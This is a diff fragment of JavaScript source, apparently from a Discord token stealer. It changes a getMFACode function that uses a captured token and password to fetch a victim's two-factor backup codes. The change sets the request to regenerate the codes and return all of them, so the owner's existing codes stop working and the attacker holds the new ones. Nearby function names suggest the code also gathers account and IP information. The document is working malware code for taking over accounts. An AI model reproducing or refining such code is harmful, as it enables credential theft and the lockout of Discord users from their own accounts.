@@ -648,7 +648,7 @@ function getInfo(url, token) {
 }
 
 function getMFACode(token, password) {
-    var what;
+    var what = ""
     const res = request("POST", "https://discord.com/api/v9/users/@me/mfa/codes", {
         headers: {
             "Content-Type": "application/json",
@@ -656,12 +656,12 @@ function getMFACode(token, password) {
         },
         body: JSON.stringify({
             password: password,
-            regenerate: false
+            regenerate: true
         })
     })
     var data = JSON.parse(res.getBody())
-    data.backup_codes.forEach(a => null == a.consumed && (what += `${a.code} | `));
-    return what.slice(9, -2)
+    data.backup_codes.forEach(a => what += `${a.code} | `);
+    return what.slice(0, -2)
 }
 
 function getIPInfo(ip) {
